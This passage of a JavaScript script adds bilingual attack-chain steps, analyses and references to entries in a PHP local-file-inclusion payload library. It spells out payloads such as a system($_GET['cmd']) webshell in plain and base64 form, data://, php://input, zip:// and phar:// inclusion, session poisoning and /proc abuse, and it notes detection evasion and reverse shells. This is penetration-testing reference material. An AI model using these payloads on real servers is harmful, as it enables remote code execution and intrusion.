      chain('确认 Filter 可用','Confirm filter availability','通过 php://filter/read=convert.base64-encode/resource=test 读取文件确认 Filter 链可用。','Read a file via php://filter/read=convert.base64-encode/resource=test to confirm filter chain availability.'),
      chain('生成 Filter Chain','Generate filter chain','使用 php_filter_chain_generator --chain 生成针对目标 PHP 版本的完整 Filter Chain。','Generate a complete filter chain for the target PHP version using php_filter_chain_generator --chain.'),
      chain('注入执行','Inject and execute','将链注入 LFI 参数，通过多层 iconv 字符集转换逐字节拼出并执行 PHP 代码。','Inject the chain into the LFI parameter; PHP code is constructed and executed byte-by-byte through multi-layer iconv charset conversion.'),
      chain('验证与利用','Verify and exploit','通过 cmd 参数执行命令确认代码执行成功，获取反向 Shell 或直接操作文件系统。','Confirm code execution via cmd parameter, obtain a reverse shell, or directly manipulate the filesystem.' ),
    ],
    analy: { zh: 'PHP Filter Chain 利用 php://filter 的 iconv 字符集转换进行逐字节操作，在内存中拼出任意 PHP 代码。可绕过 disable_functions 和 open_basedir，无需文件落地，是目前最先进的 LFI-to-RCE 技术之一。', en: 'PHP filter chains leverage iconv charset conversion in php://filter for byte-by-byte manipulation, constructing arbitrary PHP code in memory. This bypasses disable_functions and open_basedir without file writes — one of the most advanced LFI-to-RCE techniques.' },
    refs: ['https://github.com/synacktiv/php_filter_chain_generator','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html'],
  },
  {
    id: 'lfi-php-input',
    chain: [
      chain('确认条件','Confirm conditions','确认 allow_url_include=On 且目标 PHP 版本支持 php://input 流封装器。','Confirm allow_url_include=On and that the target PHP version supports the php://input stream wrapper.'),
      chain('构造 POST Payload','Construct POST payload','POST 请求正文中携带 <?php system($_GET["cmd"]);?>，Content-Type 设为 application/x-www-form-urlencoded。','Carry <?php system($_GET["cmd"]);?> in the POST request body with Content-Type: application/x-www-form-urlencoded.'),
      chain('包含执行','Include and execute','LFI 参数设为 php://input，服务端读取 POST 正文并执行其中的 PHP 代码。','Set the LFI parameter to php://input; the server reads the POST body and executes the PHP code within.'),
      chain('文件不落地利用','Fileless exploitation','直接通过 cmd 参数执行任意命令而无需在服务器上写入 WebShell 文件，减少被检测的风险。','Execute arbitrary commands directly via cmd parameter without writing WebShell files to disk, reducing detection risk.' ),
    ],
    analy: { zh: 'php://input 是最直接的 LFI-to-RCE 路径——将 PHP 代码放在 POST 正文以 php://input 包含执行。需 allow_url_include=On。这是完全无文件(filess)的攻击方式，不留下落盘痕迹。', en: 'php://input is the most direct LFI-to-RCE path — place PHP code in POST body and include via php://input. Requires allow_url_include=On. This is a fully fileless attack leaving no disk traces.' },
    refs: ['https://www.php.net/manual/en/wrappers.php.php','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  {
    id: 'lfi-php-data',
    chain: [
      chain('Base64 编码 Payload','Base64 encode payload','将 <?php system($_GET["cmd"]);?> 进行 Base64 编码，得到 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+。','Base64-encode <?php system($_GET["cmd"]);?> to produce the payload string.'),
      chain('构造 data:// URL','Construct data:// URL','拼接 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ 并作为 LFI 参数值。','Construct data://text/plain;base64,<base64> and use it as the LFI parameter value.'),
      chain('执行代码','Execute code','如果 allow_url_include=On，服务端将解码 Base64 并执行其中的 PHP 代码。','If allow_url_include=On, the server decodes the Base64 and executes the PHP code within.'),
      chain('绕过防护','Bypass defenses','如果 data:// 被禁用，尝试 data:text/plain,<?php... 或 data://application/x-httpd-php;base64,... 等变体。','If data:// is disabled, try data:text/plain,<?php... or data://application/x-httpd-php;base64,... variants.' ),
    ],
    analy: { zh: 'data:// 伪协议在 URL 中直接嵌入数据。将 PHP 代码 Base64 编码后通过 LFI 参数传递，如果 allow_url_include=On 则代码被执行。支持 text/plain 和 application/x-httpd-php 等 MIME 类型。', en: 'The data:// pseudo-protocol embeds data directly in URLs. Base64-encode PHP code and pass it via LFI parameter; if allow_url_include=On, the code is executed. Supports text/plain and application/x-httpd-php MIME types.' },
    refs: ['https://www.php.net/manual/en/wrappers.data.php','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  {
    id: 'lfi-php-zip',
    chain: [
      chain('构造恶意 ZIP','Craft malicious ZIP','创建包含 shell.php 的 ZIP 压缩包，WebShell 内容为 <?php system($_GET["cmd"]);?>。','Create a ZIP archive containing shell.php with <?php system($_GET["cmd"]);?> as the WebShell content.'),
      chain('上传 ZIP 文件','Upload ZIP file','通过文件上传功能上传恶意 ZIP，记录上传后的文件路径。','Upload the malicious ZIP via file upload and record the saved file path.'),
      chain('zip:// 包含执行','Execute via zip://','使用 zip://path/to/upload.zip%23shell.php 格式通过 LFI 参数包含压缩包内的 PHP 文件并执行。','Use zip://path/to/upload.zip%23shell.php format via LFI to include and execute the PHP file within the archive.'),
      chain('phar:// 替代','phar:// alternative','如果 zip:// 被禁，尝试 phar://path/to/upload.zip/shell.php，注意 Phar 会触发额外反序列化。','If zip:// is blocked, try phar://path/to/upload.zip/shell.php; note that Phar triggers additional deserialization.' ),
    ],
    analy: { zh: 'zip:// 伪协议从 ZIP 压缩包内提取并执行 PHP 代码。即使目标只允许上传 ZIP，攻击者可在包内放 WebShell 通过 LFI 的 zip:// wrapper 触发。# 符号需 URL 编码为 %23。phar:// 是更强大的替代，可额外触发反序列化。', en: 'The zip:// wrapper extracts and executes PHP code from ZIP archives. Even if only ZIP uploads are allowed, attackers can place WebShells inside archives and trigger execution via LFI\'s zip:// wrapper. The # must be URL-encoded as %23. phar:// is a stronger alternative triggering extra deserialization.' },
    refs: ['https://www.php.net/manual/en/wrappers.compression.php','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  {
    id: 'lfi-phar',
    chain: [
      chain('构造 Phar 文件','Craft Phar file','使用 PHP 创建包含反序列化 gadget chain 的 Phar 文件，设置正确的 stub 和 manifest 元数据。','Create a Phar file containing a deserialization gadget chain with proper stub and manifest metadata using PHP.'),
      chain('上传 Phar','Upload Phar','将 .phar 文件(可伪装为 .jpg/.zip 等扩展名)上传到目标服务器。','Upload the .phar file (disguisable as .jpg, .zip, etc.) to the target server.'),
      chain('phar:// 触发','Trigger via phar://','通过任何接受文件路径的函数(file_get_contents/include/fopen)使用 phar://path/file 格式触发反序列化。','Trigger deserialization via any file-path-accepting function (file_get_contents, include, fopen) using phar://path/file format.'),
      chain('获取 RCE','Achieve RCE','反序列化触发后执行任意代码，配合已选择的 gadget chain 建立反向 Shell 或写入文件。','After deserialization triggers, execute arbitrary code; establish a reverse shell or write files using the chosen gadget chain.' ),
    ],
    analy: { zh: 'Phar(PHP Archive)反序列化比传统 LFI-to-RCE 更隐蔽。phar:// 伪协议打开 Phar 文件时自动反序列化元数据，即使目标代码无显式 unserialize() 调用。任何接受文件路径且支持 phar:// 的函数(file_exists/is_dir/include/fopen)都可能成为入口点。', en: 'Phar deserialization is stealthier than traditional LFI-to-RCE. The phar:// wrapper auto-deserializes metadata when opening Phar files, triggering even without explicit unserialize() calls. Any file-path function supporting phar:// (file_exists, is_dir, include, fopen) can become an entry point.' },
    refs: ['https://portswigger.net/web-security/deserialization/exploiting','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  {
    id: 'lfi-session',
    chain: [
      chain('定位 Session 路径','Locate session path','确认 PHP Session 存储路径：/tmp/sess_<PHPSESSID>、/var/lib/php/sessions/sess_* 或通过 phpinfo 获取。','Identify PHP session storage paths: /tmp/sess_<PHPSESSID>, /var/lib/php/sessions/sess_*, or via phpinfo.'),
      chain('注入 PHP 代码','Inject PHP code','通过注册/登录/个人资料编辑等功能的输入框将 <?php system($_GET["cmd"]);?> 写入 Session 变量。','Write <?php system($_GET["cmd"]);?> into session variables through registration, login, or profile editing functionality.'),
      chain('包含 Session 文件','Include session file','通过 LFI 参数包含 Session 文件路径，文件中的 PHP 代码被解析执行。','Include the session file path via LFI; the PHP code within the session file is parsed and executed.'),
      chain('session.upload_progress 利用','session.upload_progress exploitation','利用 PHP session.upload_progress 机制通过文件上传进度数据自动写入 Session 而无需认证。','Exploit PHP session.upload_progress to auto-write to sessions via file upload progress data without authentication.' ),
    ],
    analy: { zh: 'Session 文件包含是 LFI-to-RCE 的经典技术。将 PHP 代码通过注册等功能写入 Session 后包含文件触发执行。PHP session.upload_progress 机制提供了无需认证的利用路径——文件上传过程中的进度数据被自动写入 Session 文件。', en: 'Session file inclusion is a classic LFI-to-RCE technique. Write PHP code into sessions via registration features, then include the session file for execution. The PHP session.upload_progress mechanism provides an unauthenticated path — upload progress data is auto-written to session files.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html','https://blog.orange.tw/2018/10/'],
  },
  {
    id: 'lfi-proc',
    chain: [
      chain('/proc/self/environ','Read /proc/self/environ','读取 /proc/self/environ 获取进程环境变量，其中包含服务器路径和配置信息，可注入代码到 User-Agent 等环境变量中。','Read /proc/self/environ for process environment variables containing server paths and config; inject code into User-Agent for environmental execution.'),
      chain('/proc/self/fd/','/proc/self/fd/ file descriptors','通过 /proc/self/fd/0 到 /proc/self/fd/50 访问进程打开的文件描述符，可读取临时上传文件和日志句柄。','Access open file descriptors via /proc/self/fd/0 through /proc/self/fd/50 to read temporary uploads and log handles.'),
      chain('/proc/self/cmdline','/proc/self/cmdline','读取进程命令行参数获取启动配置、文件路径和服务信息。','Read process command-line arguments to obtain startup config, file paths, and service information.' ),
      chain('/proc/net/* 和 /proc/mem','/proc/net/* and /proc/mem','读取 /proc/net/tcp 获取网络连接信息；在特定条件下可通过 /proc/self/mem 修改进程内存实现代码执行。','Read /proc/net/tcp for network connection info; under certain conditions, modify process memory via /proc/self/mem for code execution.' ),
    ],
    analy: { zh: 'Linux /proc 伪文件系统为 LFI 提供丰富攻击面：/proc/self/environ(环境变量，可通过 User-Agent 注入)、/proc/self/fd/*(文件描述符，访问临时上传)、/proc/self/cmdline(进程命令行)、/proc/net/tcp(网络连接)。在多线程 PHP 中 /proc/self/fd/ 的竞争窗口可被利用。', en: 'Linux /proc provides a rich LFI attack surface: /proc/self/environ (environment, injectable via User-Agent), /proc/self/fd/* (file descriptors, access temp uploads), /proc/self/cmdline (process arguments), /proc/net/tcp (network connections). /proc/self/fd/ race windows are exploitable in multithreaded PHP.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html','https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion'],
  },
];

let changes = 0;
for (const p of payloads) {
  const idPattern = new RegExp(`(id: '${esc(p.id)}',[\\s\\S]*?)(    tutorial: \\{)`, 'm');
  const match = content.match(idPattern);
  if (!match) { console.log('SKIP', p.id); continue; }

  const chainText = p.chain.join('\r\n');
  const refText = p.refs.map(r => `      '${r}',`).join('\r\n');
  const analyText = `    analysis: { zh: '${escSq(p.analy.zh)}', en: '${escSq(p.analy.en)}' },`;
  const refsText = `    references: [\r\n${refText}\r\n    ],`;

  const insertion = `    attackChain: [\r\n${chainText}\r\n    ],\r\n${analyText}\r\n${refsText}\r\n    tutorial: {`;
  const newText = match[0].replace('    tutorial: {', insertion);
  content = content.replace(match[0], newText);
  console.log('DONE', p.id);
  changes++;
}

writeFileSync(filePath, content, 'utf8');
console.log(`Total: ${changes} payloads enriched`);
